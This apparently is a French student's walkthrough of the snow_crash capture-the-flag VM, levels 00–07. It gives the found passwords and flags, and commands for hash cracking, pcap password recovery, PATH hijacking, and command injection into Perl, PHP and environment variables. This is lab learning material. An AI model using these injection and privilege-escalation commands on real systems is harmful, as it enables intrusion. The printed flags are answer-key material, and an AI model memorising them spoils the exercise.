# snow_crash

Se connecter : 

```c
login: level00
Password: level00
```

level00

Definitions :

Un groupe = c'est un ensemble d'utilisateurs qui partagent les mêmes droits.
Si un fichier apparatient au groupe users,a lros tout les utuilisateurs du groupe users pourront y acceder selon les permissions.


groups 



Piste : 
J'ai taper groups 
```c
level00 users
```

level00 c'est mon utilisateur principal et il appartient au groupe users.

donc j'ai voulu chercher dans l'ordinateur les fichiers qui appartient a l'utilisateur flag00 et tout le reste je les dans la poubelle temporaire ( Poubelle qui eface tout ce qu'on l'envoie)
donc il y a deux choses qui reste 

```c
/usr/sbin/john
/rofs/usr/sbin/john
```

J'ai cat le contenu et je les decrypter surdconde.fr 
cdiiddwpgswtgt

c'est du rot15

resultat: 

```c
nottoohardhere
```

Je me suis connecter avec : 
su flag00
Password: nottoohardhere

flag: 
x24ti5gi3x0o12eh4esiuxias

-----------------

level01 

Piste: 
j'ai tape : 

```c
cat /etc/passwd 
cela liste tout les comptes utilisateur qu'il y a sur cette ordinateur
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash

```

c'est le mot de pass et pour dechiffer un mot de passe, il faut utiliser
john the ripper
J'ai installer nix-shell 
```c
sh <(curl -L https://nixos.org/nix/install)
```
puis j'ai installer john the ripper 

```c
nix-shell -p john
```

j'ai envoyer le contenu dans un fichier
```c
echo "flag01:42hDRfypTqqnw" > hash.txt

```
j'ai utiliser john sur le fichier

```c
john hash.txt
```

flag: f2av5il02puano7naaf6adaaf

------------------------------------------
level02

j'ai fais ls
j'ai vue .pcap 
c'est un enregistrement de trafic et donc on utilise wireshark pour explorer
et comprendre le trafic.

scp -P 4242 level02@10.11.248.91:/home/user/level02/level02.pcap .
pour mettre le fichier sur mon ordinateur

installer Wireshark

```c
nix-shell -p wireshark
```

j'ai donner les deroit au fichier et
j'ai lancer wireshark
```c
chmod 777 level02.pcap
wireshark level02.pcap
```

clique droit sur Pas sword:
```c
tcp screen
```

```c
..%..%..&..... ..#..'..$..&..... ..#..'..$.. .....#.....'........... .38400,38400....#.SodaCan:0....'..DISPLAY.SodaCan:0......xterm.........."........!........"..".....b........b....	B.
..............................1.......!.."......"......!..........."........"..".............	..
.....................
Linux 2.6.38-8-generic-pae (::ffff:10.1.1.2) (pts/10)

..wwwbugs login: l.le.ev.ve.el.lX.X
..
Password: ft_wandr...NDRel.L0L
.
..
Login incorrect
wwwbugs login: 
```
Il a taper son mot de pass puis 3 fois il a appuyer sur del.
ft_waNDReLOL

flag: kooda2puivaav1idi4f57q8iq

-----------

level03

ls -l 
j'ai vue qu'il avait un executable

je l'ai copier sur mon ordi pour l'analyser sur dogbolt
```c
scp -P 4242 level03@10.11.248.91:/home/user/level03/level03 ~/Desktop/
```

etape: 
dans le main on a vue ceci 

```c
system("/usr/bin/env echo Exploit me")
```
Cela veut dire qu'il execute un truc dans la variable env. 


donc on vas lui injecter un faux echo 
```c
echo "/bin/sh" > /tmp/echo
chmod +x /tmp/echo
export PATH=/tmp:$PATH
./level03
```


flag: qi0maab88jeaj46qoumi7maus

--------------

level04

j'ai cat le fichier Perl 

j'ai vue
```c
print `echo $y 2>&1`;
```
ce que l'utilisateur envoie dans url , on le met apres un echo

```c
curl "http://localhost:4747/?x=\`getflag\`"
```

Ici, on remplace l’argument de echo par la sortie de getflag → donc c’est getflag qui est exécuté par Perl, et son résultat est imprimé.


flag: ne2searoevaevoem4ov4ar8ap

-----------

level05

```c
find / -user flag05 2> /dev/null 
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

j'ai cat

#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done

il exécute n’importe quel script placé dans /opt/openarenaserver/.


donc je vais executer mon getflag
```c
echo "getflag > /tmp/result_flag05" > /opt/openarenaserver/monscript.sh
```

puis je cat
```c
cat /tmp/result_flag05
```

flag: viuaaale9huek52boumoomioc

-------------

level06

ls -la 

```c
-rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
```

j'ai cat le fichier php

on a compris que le code permet de lancer une fonction avec le /e

```c
$a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

donc 

```c
echo '[x ${`getflag`}]' >> /tmp/test.txt
```

puis j'ai lancer executable. 

flag: wiok45aaoguiboiki2tuin6ub


---------------------------------
level07


ls -la 
c'est un execulatable 

j'ai executer cette comande dans un terminal neutre 
```c
scp -P 4242 level07@10.11.248.91:/home/user/level07/level07 ~/Desktop/
```

puis je l'ai fais decrypter sur dogbolt.


```c
asprintf(&cmd, "/bin/echo %s ", getenv("LOGNAME"));
```

cela veut dire qu'il execute ce qu'il y dans getenv
donc je change la variable d'environnement
je lui dis d'executer getflag 

```c
export LOGNAME='$(getflag)'
```
apres je lance le script

-----
level 08






